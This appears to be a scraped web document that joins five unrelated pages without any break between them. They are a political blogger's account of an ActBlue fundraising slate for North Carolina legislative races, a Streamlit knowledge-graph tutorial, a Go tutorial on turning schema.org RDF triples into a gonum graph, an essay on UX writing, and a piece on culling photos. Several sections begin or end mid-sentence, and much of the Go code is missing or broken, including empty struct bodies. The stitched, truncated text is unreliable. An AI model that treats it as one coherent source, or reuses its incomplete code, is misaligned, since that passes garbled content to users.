<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>Back last winter – in the beforetimes, as they say now – I did a lot of thinking about how I could be most politically impactful in this election cycle. What I landed on was fundraising focused on my state legislature here in North Carolina. <a href="http://blairreeves.me/2020/08/31/thoughts-on-fundraising/">I wrote a blog about it</a> – one of the few I’ve gotten around to writing this year – and promised a follow-up on what I learned about the nuts-and-bolts of indie political fundraising. So here is that follow-up.</p>

<p>When I launched the <a href="http://longleafpineslate.org/">Long Leaf Pine Slate</a> in January of 2020, I figured I might be able to raise a few thousand dollars from family and friends. Not much, but something. We wound up doing a lot more than that. “The Slate” caught fire, and over the course of the year, became <i>the largest independent channel of funding based in the state</i> to Democrats running for the North Carolina state legislature. We raised more than $300,000 from over a thousand donors for a small group of our most strategic Democratic candidates running against vulnerable Republican incumbents.</p>
<p>That may not sound like much if you’re used to reading about Senate races which raise tens of millions. But at the state legislative scale, that’s actually very big money. Here’s some comparison to give you a sense of scale:</p>
<p><img loading="lazy" src="http://blairreeves.me/wp-content/uploads/2020/11/Q3-PAC-graphic.png.pagespeed.ce.kwwoCB2JuC.png" alt="" width="960" height="540" srcset="http://blairreeves.me/wp-content/uploads/2020/11/Q3-PAC-graphic.png.pagespeed.ce.kwwoCB2JuC.png 960w, http://blairreeves.me/wp-content/uploads/2020/11/xQ3-PAC-graphic-300x169.png.pagespeed.ic.5vOtQdpn_j.png 300w, http://blairreeves.me/wp-content/uploads/2020/11/xQ3-PAC-graphic-768x432.png.pagespeed.ic.GDK3GM5_As.png 768w" sizes="(max-width: 960px) 100vw, 960px"></p>
<p>If the Long Leaf Pine Slate were a PAC, we’d have been the third-largest in the state and the single largest donor to Democrats based in North Carolina. Better: all of that money went to just a small group of our most important races. We raised almost as much money for those select Democrats as Duke Energy – basically the evil empire of right-wing power in North Carolina – gave to Republicans. (Directly, anyway. More on that later.)</p>
<p>The Long Leaf Pine Slate was nothing but <a href="http://longleafpineslate.org/">a website</a> that linked to an ActBlue fundraising page featuring our candidates and <a href="https://twitter.com/forwardcarolina">a Twitter account</a>. When donors gave, every dollar thus went directly to our candidates’ campaigns, nowhere else. The Slate was not, itself, a PAC – meaning we didn’t touch any money. You could not, for example, write a check to the Long Leaf Pine Slate. We didn’t even have a bank account. It was a 100% volunteer project.</p>
<p>Something similar to this – a no-nonsense ActBlue fundraising slate for state legislative candidates – should exist in every state. If you’re reading this, maybe you should start one, or join up with others who are. The purpose of this blog is to offer up some lessons learned, and maybe – just maybe – convince you, dear reader, that you can do this too.</p>
<h2>Why this model works</h2>
<p>An ActBlue fundraising page literally takes every dollar that is contributed and just slices it up among the campaign recipients you list. If there are ten campaigns listed, then each gets 10 cents. It’s that simple. What you see is what you get.</p>
<p>Old-fashioned PACs and parties act as intermediaries between a donor and the campaigns that need their money, and this causes lots of problems. Unfortunately, both (but particularly PACs) tend to be incredibly inefficient ways for donors to help the good guys, and wind up spending lots of money on things other than getting candidates elected. Very, very few people who give to PACs or parties ever actually look at the disclosures to see where their money went. Without naming names, I have been personally disappointed when I actually saw the spending disclosures from progressive PACs that I thought were good, but turned out to be big money-furnaces for politicos to get paid. (Caveat: yes, there are some good PACs too. They’re just rarer than you’d think.)</p>
<p>Besides its transparency, another large advantage of the ActBlue model is it allows organizations to raise substantially more money per candidate. If we’d been a PAC, we would’ve been limited to giving $5,400 per endorsed candidate – the legal maximum in North Carolina. But in the ActBlue model, <i>we’re</i> not the donor – in a way, we’re just pointing the actual donors to a list of candidates and saying, “these are the folks to give to.” So when you get lots and lots of folks giving money through that page, and each one can give up to the legal limit, it really adds up. ActBlue allows you to see just how much folks have given through your page, which is how we know the Slate raised so much money, almost entirely from folks who never would’ve found our candidates otherwise.</p>
<p>Fun fact: unlike the PACs, the Long Leaf Pine Slate is completely invisible on NC campaign finance reports. All the reports show is the donors, not the online channel they used. This keeps the Republican oppo researchers guessing and the media clueless. But the candidates know very well, because their ActBlue candidate dashboards show exactly what fundraising pages their money is coming from.</p>
<p>Legal stuff: every state is different, but this model is perfectly compliant everywhere I’m aware of. In North Carolina, there are certain conditions where you need to establish a political committee to promote candidates for office – like if you spend much money doing it. We thus had a (very, very low) spending limit for this project. This is the reason for the Slate’s <a href="http://longleafpineslate.org/">extremely basic webpage</a> – it’s literally just a hardcoded HTML file sitting on AWS. Dirt cheap! (I had lots of folks write in offering their help to create a much fancier webpage. This was very generous, but I could do that too. It’s basic because we couldn’t afford to do something nicer. I’m not kidding when I said our spending limit was low.)</p>
<p>Check out <a href="https://medium.com/@longleafpineslate/the-long-leaf-pine-slate-44e6abc51318">this explanatory post</a> about the Long Leaf Pine Slate that covers why raising money matters, why it’s hard for most candidates, and why that difficulty enables a lot of corporate corruption in our politics.</p>
<h2>What we did</h2>
<p>After I built the website and set up the ActBlue page, I knew that making a splash on social would be vital to winning eyeballs and attention for the Slate. So pre-launch, I begged a lot of big-audience folks on Twitter for retweets. Believe me, it felt as cringeworthy as it sounds. But incredibly, some obliged, including <a href="https://twitter.com/jasonkander">Jason Kander</a>, <a href="https://twitter.com/Bakari_Sellers">Bakari Sellers</a>, <a href="https://twitter.com/jeffjacksonnc/">Jeff Jackson</a>, <a href="https://twitter.com/ClintSmithIII">Clint Smith</a>, <a href="https://twitter.com/danpfeiffer">Dan Pfeiffer</a> and several more. The initial pop sent a lot of traffic and eyeballs on the project, and a little money. It made a difference. (Over time, I noticed that social eyeballs were good for traffic, but not so much for money.)</p>
<p>But what really made the Slate grow was just flogging it relentlessly every day. It was honestly a real grind. I sent hundreds of cold emails. (Didn’t work.) I promoted the Slate on Twitter, explaining why it was important. (Kinda worked.) <a href="https://medium.com/@longleafpineslate">I blogged about it</a> (useful for inbound traffic, sometimes for money).</p>
<p>What I found was that successfully fundraising requires you to be needy, persistent and a little bit pushy. Very, very few people will ever volunteer to give you money. You have to ask. And the vast majority of people you ask (directly or not) will say no. And just like in a job interview, you can’t take it personally. (If I cold emailed you and asked for money, sorry!) Asking for money sucks. I don’t like it and I don’t think anyone else does, either. But doing so for a good cause makes it a little easier, and over time, I got used to it.</p>
<p>I just kept doing this all year. Call it a “hustle” or “bootstrapping” or whatever you like, but slowly and gradually, folks started paying attention. We started raising more money. A real audience began to develop. I started writing <a href="https://thelongleafpineslate.substack.com/">email updates</a> to our donors, and those were a hit. Our list grew.</p>
<p>Speaking of email, another fun fact: as a fundraising page owner, ActBlue gives you the ability to ask your donors whether they want to share their email addresses with the recipient campaigns or not. I enabled this, so that every contributor to the Slate got to choose. The Slate still gets your email address, but whether recipient campaigns do was up to you. I now have a rather large donor list, and I made everyone a promise: the Slate will never, ever share or sell your email. It’s just not a deal I’m interested in. You’re welcome.</p>
<p>I knew we must be doing something right when Republican spies started sniffing around. I started getting emails from “supporters” I didn’t recognize, from obviously fake email addresses, asking for recordings from candidate calls. (<a href="https://americarisingpac.org/about/">America Rising</a> lackeys, I see you!) The Slate works in public, so this was fine – a vote of confidence if nothing else.</p>
<h2>So, what happened?</h2>
<p>I won’t bury the lede here: we still lost many of the races we backed.</p>
<p>So was this all a failure? Nah. The money mattered. But as I always remind people, money is just ammunition. It doesn’t buy races. We were able to raise money early in the cycle, which mattered a lot for our candidates. (For a campaign, $1 in October is worth $5 in January.) We funded candidates in “frontier” districts, where the fundamentals were hard, often in rural and exurban areas. Most of our candidates outperformed Biden in their districts, but unfortunately, the “top of the ticket” just didn’t perform as well in NC as we needed it to. Democrats nationwide had a rather poor showing downballot, so it wasn’t just us.</p>
<p>But it wasn’t a total loss. Some of our candidates (both millennials!) won. In other places, we funded campaigns where there hadn’t been a really legit Democratic campaign in a decade or more. Even though we lost, there’s now a network of volunteers in place and up-to-date supporter lists that will make subsequent campaigns much stronger. To win, you need to run candidates in difficult districts, and when you do that, some of them are going to lose.</p>
<p>Besides – we were also badly outspent. Remember Duke Energy above? Well, aside from their direct (“hard”) giving, they sunk millions of dollars into a dark-money super PAC to run ads and mailers vilifying Democrats. So did the NC Chamber of Commerce. The Chamber’s super PAC, Citizens for a Better North Carolina, was run by two former top aides to Phil Berger (the GOP State Senate leader) who now have their own political consultancy. (Though of course, I’m sure all of their business was conducted without any …</p></div></div>

A knowledge graph is a graph that represents knowledge about entities and their relations in a flexible manner which offers more freedom than static relational database schemas. The term was originally introduced by Google in 2012 and they wrote a great blog post called <a href="https://blog.google/products/search/introducing-knowledge-graph-things-not/" rel="noopener">“Things not strings”</a> about the advantages of knowledge graphs [also the short video in the blogpost is pretty awesome] . </p></div><p>Now let's get our hands dirty and use the Agraph component to build a simple graph.</p><h2 id="build-a-graph-to-visualize-inspirational-people">Build a graph to visualize inspirational people</h2><figure><img src="https://blog.streamlit.io/content/images/2020/11/Screen-Shot-2020-11-25-at-9.36.31-AM.png" alt="" srcset="https://blog.streamlit.io/content/images/size/w600/2020/11/Screen-Shot-2020-11-25-at-9.36.31-AM.png 600w, https://blog.streamlit.io/content/images/size/w1000/2020/11/Screen-Shot-2020-11-25-at-9.36.31-AM.png 1000w, https://blog.streamlit.io/content/images/size/w1600/2020/11/Screen-Shot-2020-11-25-at-9.36.31-AM.png 1600w, https://blog.streamlit.io/content/images/size/w2400/2020/11/Screen-Shot-2020-11-25-at-9.36.31-AM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>For our simple graph, we want to find out how famous people were inspired - so which famous person inspired whom or by whom he/she was inspired. We also want to visualize these persons and the relationships in the graph.</p><p>To do this, we'll go through these steps:</p><ol><li>Query data from a SPARQL endpoint (<a href="http://dbpedia.org/sparql" rel="nofollow noopener">http://dbpedia.org/sparql</a> using SPARQLWrapper library) to get a JSON file.</li><li>Parse from JSON to Python and then create a triple (nodes and edges representing famous people and either &nbsp;two types of relations 1: inspired, 2: was_inspired_by).</li><li>Publish our app with Streamlit sharing.</li></ol><h2 id="install-the-libraries">Install the libraries</h2><p>To follow along in the tutorial you'll need to install the following libraries in a terminal:</p><pre><code>
pip install Streamlit
pip install streamlit-agraph
pip install SPARQLWrapper

</code></pre><h2 id="get-the-data">Get the data</h2><p>After we've installed the needed libraries, we'll want to write a small function that defines SPARQL query and crawls the data (if you’re not familiar with sparql that's ok):</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>What's important to understand from this snippet?</p><p>One of the key classes of Agraph is the <strong>TripleStore </strong>- it serves as the central data store. Internally, the TripleStore consists of <em>three</em> <em>sets</em>, each belonging to the <strong>Nodes</strong>, <strong>Edges</strong> and <strong>Triples</strong> classes respectively. By using sets it's ensured that no duplicate triples, nodes or edges are added and it allows easier conversion to other data types.</p><p>New triples can be added to the TripleStore with this method:</p><pre><code>store.add_triple(node, edge, node)</code></pre><p>We only have to pass the source node, the edge, and the target node<br>(<strong>Notice</strong>: the order matters in this case!).</p><h2 id="create-the-streamlit-app-with-triplestore">Create the Streamlit app with TripleStore </h2><!--kg-card-begin: html--><!--kg-card-end: html--><p>To render an Agraph component we have to pass three parameters to the function. </p><p>1. A list of nodes where each node is an instance of the class Node.<br>At this point we can take advantage of the TripleStore as follows:</p><pre><code>list(store.getNodes())</code></pre><p>2. &nbsp;A list of edges where each edge is an instance of the class Edge:</p><pre><code>list(store.getEdges())</code></pre><p>3. The class offers the opportunity to define general settings for the rendering:</p><pre><code>config = Config(height=500,
		width=700, 
                nodeHighlightBehavior=True,
                highlightColor="#F7A7A6", 
                directed=True, 
                collapsible=True)</code></pre><p>Finally, we can plug all three parts into the Agraph component, and can now see the results by running:</p><pre><code>streamlit run app.py
</code></pre><p>Check it out yourself! 🙂</p><h3 id="you-can-run-this-without-triplestore">You can run this without TripleStore</h3><p>It's not necessary to use a TripleStore. The Agraph component takes nodes and edges separately, which is due to the fact that both classes themselves provide a multitude of parameters for customization. Each instance of the class Nodes and Edges must have at least one unique identifier - which will usually be a string. For example, we could do:</p><pre><code>
nodes = []
edges = []
nodes.append(Node(id="Spiderman", size=400, svg="http://marvel-force-chart.surge.sh/marvel_force_chart_img/top_spiderman.png") )
nodes.append( Node(id="Captain_Marvel", size=400, svg="http://marvel-force-chart.surge.sh/marvel_force_chart_img/top_captainmarvel.png") )
edges.append( Edge(source="Captain_Marvel", target="Spiderman", type="CURVE_SMOOTH"))

</code></pre><h2 id="push-the-app-to-streamlit-sharing">Push the app to Streamlit sharing</h2><p>For deploying the component I used Streamlit sharing, which for now is invite only, <a href="https://www.streamlit.io/sharing">but you can sign up here</a>.

      <p>In a <a href="https://blog.owulveryck.info/2020/11/13/ontology-graphs-and-turtles-part-i.html">previous article</a>, I introduced the notion of ontology and knowledge graph.</p>
<p>Let’s go deeper into the concept and apply some technology to create an actual graph structure and eventually play with it.</p>
<p>At the end of this article, we well have parsed a triplestore in turtle format and created a graph structure in Go (based on <a href="https://pkg.go.dev/gonum.org/v1/gonum/graph">gonum’s interface</a>)</p>
<h2 id="the-triplestore">The triplestore</h2>
<p>As explained in the last post, our knowledge database is a triple store. As a matter of example, I will rely on the ontology exposed by <a href="https://schema.org/">schema.org</a>.</p>
<p>Schema.org is a collaborative, community activity with a mission to create, maintain, and promote schemas for structured data on the Internet, on web pages, in email messages, and beyond. Founded by Google, Microsoft, Yahoo and Yandex, Schema.org vocabularies are developed by an open community process […].
You can grab the complete ontology with this command:</p>

<p>To parse the store, I am using the package <a href="https://github.com/deiu/gon3"><code>gon3</code></a> from <a href="https://twitter.com/andreisambra">Andrei Sambra</a>. Even though there is no license attached, Andrei allowed me to use it and to modify it for non-profit code.</p>
<p>I forked the repo to make some minor adjustments I needed for my experiments.</p>
<p>The entry point of the package is a <code>Parser</code> structure. Its purpose is to read a byte stream (<code>io.Reader</code>) and turn it into a functional structure called <code>Graph</code>. The <code>Graph</code> structure within the package is not representing all the edges. Still, it consists of an array of Triples (aka rdf graph):</p>

</div>
<p>In the previous article, we saw that a term in RDF can be expressed in different types. As of today, the way to represent generic types in Go is to use interfaces. Therefore, a <code>Term</code> has an <code>interface</code> based definition:</p>

<p>Two important objects are implementing the Term interface:</p>
<ul>
<li>IRI</li>
<li>Literal</li>
</ul>
<h4 id="generate-the-rdf-graph">Generate the RDF Graph</h4>
<p>If we glue all the concepts together we have the possibility to create a basic structure:</p>

<p>Then we can test the plumbing with the file we downloaded from schema.org previously:</p>

<pre><code data-lang="shell">&gt; cat schemaorg-current-http.ttl<span>|</span> go run main.go

</div>
</div><p>We can check that roughly the number of triple matches what’s expected by counting the rdf separators from the file:</p>
<div><div>

<h3 id="understanding-the-graph-structure">Understanding the graph structure</h3>
<p>We have an “RDF” graph in memory; sadly, this structure is not a directed graph. I mean that it is not <em>de facto</em> possible to navigate from nodes to nodes or to identify the edges.</p>
<p>To create a graph, the best option in Go is to rely on the abstraction created by <a href="https://pkg.go.dev/gonum.org/v1/gonum/graph#Graph"><em>gonum</em></a></p>
<p>In Gonum a graph is an interface that manages two objects fulfilling the <code>Node</code> and <code>Edge</code> such as:</p>

<p><em>Note</em>: all comments have been removed for brevity. The full definition is available <a href="https://pkg.go.dev/gonum.org/v1/gonum/graph#Graph">here</a></p>
<p>Once the graph objects are fulfilling those interfaces, it becomes possible to use all the graph algorithms that have been implemented by the gonum team.
Please go to this link if you wish to learn more about the capabilities: <a href="https://pkg.go.dev/gonum.org/v1/gonum/graph#section-directories">pkg.go.dev/gonum.org/v1/gonum/graph#section-directories</a></p>
<h4 id="our-graph-structure">Our graph structure</h4>
<p>We will create a top-level structure that will act as a receiver for our graph. For the graph itself, we rely on the <a href="https://pkg.go.dev/gonum.org/v1/gonum/graph/simple#DirectedGraph"><code>simple.DirectedGraph</code></a> implementation provided by the gonum’s project.</p>
<p>So we have:</p>

    <span>*</span><span>simple</span><span>.</span><span>DirectedGraph</span>
<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>Then we will create a function to create and fill our graph from our rdfGraph.</p>

</div>
</div>
<h3 id="structure-of-the-graph">Structure of the graph</h3>
<p>Remember that the rdf graph contains an array of triples. Each triple is a term.</p>
<p>The object of a predicate is the subject of another triple. For example:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span></code></pre></td>
<td>
<pre><code data-lang="turtle"><span>schema:</span><span>subject1</span><span> </span><span>schema:</span><span>predicate</span><span> </span><span>schema:</span><span>object1</span><span> </span><span>.</span><span>
</span><span></span><span>schema:</span><span>object1</span><span> </span><span>schema:</span><span>otherPredicate</span><span> </span><span>schema:</span><span>object2</span><span> </span><span>.</span><span>
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>Would lead to the following graph:</p>
<p><img src="https://blog.owulveryck.info/assets/ontology/graph1.svg" alt=""></p>
<p>This indicates a choice I’ve made: I want to produce a graph where its node corresponds to a subject declared <strong>inside</strong> the triplestore.
Therefore, in the example, <em>object2</em> is not a node because it is not defined as a subject to a sentence. It is relatively easy to change this behavior and reference other nodes, but let’s keep that apart.</p>
<h4 id="declaration-of-the-node">Declaration of the node</h4>
<p>The node object declaration is pretty straightforward. A node is a structure holding:</p>
<ul>
<li>an id</li>
<li>a subject as seen before</li>
<li>and a map of predicates and objects associated with the predicate.</li>
</ul>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5

<pre><code data-lang="go"><span>type</span> <span>MyNode</span> <span>struct</span> <span>{</span>

<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>Adding a method <code>ID()</code> that returns an int64 makes it compatible with gonum’s Node interface.
Therefore it is possible to add it to a simple graph. So far, this codes compiles (but is useless):</p>

<h4 id="declaration-of-the-edge">Declaration of the edge</h4>
<p>Using the same principle, we create an Edge structure that holds two nodes <code>From</code> and <code>To</code> as well as a term that defines the edge.</p>

<p>We have created a graph with two nodes and an edge between them.</p>
<h3 id="parsing-the-rdf-graph-to-generate-our-directed-graph">Parsing the rdf graph to generate our directed graph</h3>
<p>The first thing we’ll do is to create a tree of terms. We do that thanks to a hash map.
The key is a subject, and the value is another map. The map value’s key is a predicate and the value is an array of objects (remember that a predicate can point to several objects)</p>
<div><div>

</div>
</div>
<p>But before parsing the rdf graph to fill the tree, we have to address a little gotcha. a <code>Term</code> is an interface. Therefore it is a pointer. Therefore in the rdf graph, if we consider two <code>Terms</code> <code>t1</code> and <code>t2</code> such as:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span></code></pre></td>

</div>
</div>
<p><code>t1</code> is different from <code>t2</code> (even is their values are the same)</p>
<p>To address this, we will track a dictionary of terms indexed by their <code>RawValue()</code>.</p>
<div><div>

<p><em>Note</em>: once again, for convenience, we track the nodes in a hash map. This reference map has the subject as a key and the node as a value (its type is <code>map[rdf.Term]*Node</code>).</p>

If you have not not seen it yet, go stream that masterpiece right now. #spoilers</p><p id="0d41"><strong>Why is this particular line so important?</strong> Because it is part of the keychain needed to unlock the many abstract concepts Lynch and Mark Frost presents to us, the viewers. The line is from the episode where Mike enters the dream of agent Cooper, revealing clues about Laura Palmers killer. What I find interesting about this line is its deceptive yet clear intention. The viewer is told what to pay attention to, but the dreamy context suggest we might be deceived.</p><p id="f29a">But some things are just what it is, how it sounds.</p><p id="57db"><em>Intuition guides us, one screen at the time.</em></p><p id="4949">For 10 years, I was writing for various advertising companies. My job was to craft words to lure the reader into whatever brand-context I was working on at that time, often with the help of abstractions of concepts, allegories, and other creative tools. It taught me a lot about perception and how I could, very subtly, plant hints for the viewer to decipher the brand message. But most importantly, it made me understand how the brain systematically create mental concepts to percieve and understand the world around it. Words play a crucial part in this process. An incredible 50 % of all words we hear cannot be understood out of context (when presented in isolation). By using concepts, the brain learns to categorize and make sense of all this variable noisy flow of information.</p><p id="b300">How ironic, you might think, that I found clarity in one of the most surreal dreamscapes ever to air on TV in our lifetime. To me, that’s the beauty of inspiration. It rises to our consciousness like wild salmon jumping upstream a river, striving to get a foothold in our mind amidst all the noise.</p><p id="4668">Like Lynch and Frost, I left the keys in plain sight for the audience to discover and interpret. Creative advertising requires just that, an idea we, the creators, code, and then let the audience decode. But UX Writing very often requires quite the opposite. You must write it like it is.</p><p id="856a">It has always been a beautiful mystery to me, how clarity has the power to shape us. How it informs us simply by being less intrusive or more truthful. <br>To me clarity is not the equivalent of writing short and efficient sentences. It can be about that, but not just that. Clarity is about finding the true essence of whatever you’re trying to convey. It’s what will make your followers believe you or not and go where you’re guiding them. Or not.</p><blockquote><p id="edd9"><strong><em>Just do it</em></strong></p><p id="2f63"><strong><em>I have a dream</em></strong></p><p id="78b1"><strong><em>Fire, walk with me</em></strong></p></blockquote><p id="d321">But clarity is also this</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1660/1*_pOIZ5e4OVW8mpSHrj55qA.png" width="830" height="1170" srcset="https://miro.medium.com/max/552/1*_pOIZ5e4OVW8mpSHrj55qA.png 276w, https://miro.medium.com/max/1104/1*_pOIZ5e4OVW8mpSHrj55qA.png 552w, https://miro.medium.com/max/1280/1*_pOIZ5e4OVW8mpSHrj55qA.png 640w, https://miro.medium.com/max/1400/1*_pOIZ5e4OVW8mpSHrj55qA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/42/1*_pOIZ5e4OVW8mpSHrj55qA.png?q=20"></p></div></div></div><figcaption>Airbnb safely disarming thousands of anxious customers with one single line of text.</figcaption></figure><p id="e258">The real challenge is to fuse the two worlds into one. For that to happen you’ll need to sit down, relax, focus, open your mind and just…</p><p id="cf21">In an interview with <a href="https://www.youtube.com/watch?v=VV7cZB7xqks" rel="noopener">Vanity Fair</a>, Jony Ive, former Chief Design Officer of Apple, said that Steve Jobs had an amazing ability to focus. He managed to eliminate the inevitable noise surrounding any world-changing project and devote all his attention to making it the next big thing.</p><p id="4ba2">Regardless of age, title and which floor you work on, there is a valuable lesson to be learned from this, Focus is needed to build great stuff, but it also essential for knowing when your brand needs to speak up. Or when to shut up.</p><p id="a94a">Understanding when to do what requires <strong>the ability to listen</strong>. I will listen to what the customer says about their experience. Pay attention to what the designers have to say about their intentions and challenges. Concentrate as programmers show me the project’s specifics and possibilities.</p><p id="879e">Jobs did this and was not afraid to change his mind should it benefit his creative singularity. It takes a great amount of willpower to let go of your own ideas.</p><p id="5d5c"><a href="https://youtu.be/woI6t8dCQcQ?t=594" rel="noopener">In an interview with Drumeo,</a> drummer Gavin Harrison, known for his musicality and passion for rhythmic design, shared his tips and methods for coming up with tasteful drum parts, improving your creativity, and your general mindset when playing the drums. While talking about his references from his younger days, he begins talking about drummers who play with time.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1500/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg" width="750" height="500" srcset="https://miro.medium.com/max/552/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg 276w, https://miro.medium.com/max/1104/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg 552w, https://miro.medium.com/max/1280/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg 640w, https://miro.medium.com/max/1400/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*IX7QE5zUqs3uLgxlMfOH8A.jpeg?q=20"></p></div></div></div><figcaption>Gavin Harrison exploring rhytmic designs in his natural habitat.</figcaption></figure><p id="dfc5">“You’ve probably heard this expression before, but everybody’s job in the band is to play in time, but it’s the drummer’s job to make the time interesting. So, you don’t have to just play, say, if the first verse just needs two and four on the hi-hat, you don’t have to just sit there going… <em>&lt;taps uninspired on the hi-hat&gt;</em> …what I would do is listen to the vocalist and look for spaces to do small musical embellishments. <strong>Put it in the right place, and it’s beautiful. Do it every bar, and it’s horrible.”</strong></p><p id="2340">This is <strong><em>precisely</em></strong> what UX Writers should do (among many other important things). Listen to the project as a whole, look for spaces in between code, design, text, menus, forms — literally every point of interaction — to create something that elevates the project, and therefore the brand. Band. You know what I mean. And yes, I consider UX Writing to be an essential part of building and/or maintaining a brand.</p><p id="d052">Words are like <a href="https://en.wikipedia.org/wiki/Ghost_note" rel="noopener">ghost notes</a> providing subtle dynamics to the sonic scenery. They will make people feel something.</p><p id="5f16">Humans like to be liked. Brands too. Therefore we make and effort to portray ourselves, man and brand, in a way that will serve as purposeful and friendly for our peers. From a brand point of view we would very much like people to feel what we want them to feel about us. This is usually where marketing says “we got this”. And they probably do. Persuasion is needed to increase awareness and market shares. But what happens after we get their attention?</p><p id="fe63">This is where guidance and clarity is provided and needed, not juicy headlines and rethorical tropes. Now it’s time to go with (and steer) the flow.</p><p id="eca1">Some people understand this process intuitively and how to utilize it in many different ways. In a talk at Design Matters 2019, Senior Product Writer at Slack <a href="https://medium.com/u/6aad0c825c59?source=post_page-----2b81f09aadfc--------------------------------" target="_blank" rel="noopener">Andrew Schmidt</a> shared insight from Slacks early days on how language could be a tool for identifying “bad” design, and how they discovered when to inject brand personality and how to do it.

They have chosen a much less intrusive approach in a world where our minds are bombarded with emotional hooks ready to be reeled in.

In my younger days, I would cruise around in our family’s tiny motorboat. That was when I learned the concept of a rudder, a gentle device for navigating smoothly across the sea. This information suddenly reappeared a few years ago when I was writing about ergonomic seating. The company I wrote for had designed a new office chair that kept the person in it slightly moving while sitting down. One of them sat in the chair and used their feet to move around. Seeing this, I suggested to the designers that the feet act as a rudder to navigate the body. According to them, this was a perfect description of what they had accomplished.</p><p id="c439"><strong>I looked. I listened. And I found the embellishment I was looking for.</strong></p><p id="5e4a">In this ocean of information we’re slowly drowning in, I like to think of microcopy as an invisible rudder for our intuition. It’s there to guide you through interactive waters, shallow or deep, without you seeing it. If you can see the rudder, you’ve probably hit bottom, and then you have to slow down to understand the situation. When designing interactivity, people crave fluidity. Like in a musical piece that captivates us or in a movie that enthralls us with great dialogue and scenery. Or even a game like Red Dead Redemption 2 whose job is to help us navigate 60+ hours of content while keeping us immersed in their universe. Well played.</p><p id="54c3">Our understanding of the world is layered in mental concepts. Everything can be stripped down to its very basic components. Even what we know to be basic components has its own basic components. By understanding this, one becomes humble when faced with the task of understanding complex matters. Or answering complicated questions.</p><p id="24c2">Whenever I write, my goal is always to find the simplest version of the truth intended. By truth, I mean the pieces of information I relay to people who desire an outcome of some sort, typically in an app or landing page. Sometimes I need to let function dictate what I write; other times, it feels like a good time to sparkle with some creativity.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2238/1*r7e4HbF2CWByVxNXGxryTg.png" width="1119" height="1117" srcset="https://miro.medium.com/max/552/1*r7e4HbF2CWByVxNXGxryTg.png 276w, https://miro.medium.com/max/1104/1*r7e4HbF2CWByVxNXGxryTg.png 552w, https://miro.medium.com/max/1280/1*r7e4HbF2CWByVxNXGxryTg.png 640w, https://miro.medium.com/max/1400/1*r7e4HbF2CWByVxNXGxryTg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*r7e4HbF2CWByVxNXGxryTg.png?q=20"></p></div></div></div><figcaption>A good example of creative microcopy.

<p>As a professional photographer, we always want to get the best shot and use the best photo editing software to select and edit. However, to get the best images, some photographers capture more than just one photo.</p>
<p>Having a safe shot and another angle is an excellent practice for photographers. Nonetheless, you’ll also get if not hundreds, but thousands of photos when you get home, and you need to go through all of them.</p>
<p>Let’s face it; culling photos can take a lot of time and take a toll on your productivity. Here are some of the reasons that can also affect your productivity when culling photos:</p>
<h2 id="procrastination-becomes-your-muse">Procrastination Becomes Your Muse</h2>
<p><img src="https://filterpixel.com/images/procastination.jpg" alt="Procrastination Becomes Your Muse" title="Procrastination Becomes Your Muse"></p>
<p>It’s not a secret that all professionals procrastinate at some point because, let’s face it, people get tired - you are not alone. You can also get distracted or even don’t have the strength to power through your work, and it’s normal and acceptable.</p>
<p>Here are some of the things that you can do to make punctuality and timeliness your muse, again:</p>
<h3 id="forgive-yourself">Forgive yourself</h3>
<p>Don’t dwell on your past procrastination and forgive yourself. Forgiveness is essential so you can start anew and move forward in working on your deliverables.</p>
<h3 id="identify-the-reason-why-youre-avoiding-the-task">Identify the reason why you’re avoiding the task</h3>
<p>Make sure to find the cause or reason why you’re avoiding work or culling your photos. Then, find a solution for you to avoid getting stuck.</p>
<h3 id="cull-your-to-do-list">Cull your to-do list</h3>
<p>Yes, we’re talking about photos here, but it’s also essential to look at the bigger picture and look at your overall to-do list. In this way, you can focus on culling and editing your photos without any distractions.</p>
<h3 id="avoid-multitasking">Avoid multitasking</h3>
<p>If we don’t focus on one task, even if we have the best photo editing software to aid us, we still wouldn’t get things done. So, make sure to focus on what’s essential or top on your to-do list.</p>
<h2 id="you-dont-have-a-culling-criteria">You Don’t Have a Culling Criteria</h2>
<p><img src="https://filterpixel.com/images/dont-have-culling-criteria.jpg" alt=""></p>
<p>Reference: <a href="https://unsplash.com/photos/RLw-UC03Gwc" title="https://unsplash.com/photos/RLw-UC03Gwc">https://unsplash.com/photos/RLw-UC03Gwc</a></p>
<p>Photo culling software and tools are essential, but the most important aspect, however, is your culling criteria. If you don’t have one, then, chances are, this is one of the reasons why you’re failing.</p>
<p>Here are some of the steps and process to help you create your criteria today:</p>
<ul>
<li>Remove out-of-place photos in your album</li>
<li>Remove blurry, overexposed, or underexposed photos</li>
<li>Remove duplicate photos in your album</li>
<li>Accidental pictures and another unnecessary frame should be removed from your album</li>
</ul>
<h2 id="you-delete-photos-instead-of-selecting-good-ones">You Delete Photos Instead of Selecting Good Ones</h2>
<p><img src="https://filterpixel.com/images/dont-delete-photos.jpeg" alt="You Delete Photos Instead of Selecting Good Ones" title="You Delete Photos Instead of Selecting Good Ones"></p>

<p>It’s human nature to consider often or even act on deleting bad photos in your album or set for the day. It’s a normal instinct but, human as we are, it’s also a flawed approach in culling photos.</p>
<p>Here are the things you need to think about when culling photos before touching the delete key:</p>
<ul>
<li>Do not delete photos even if it is below your standards, or you don’t like it.</li>
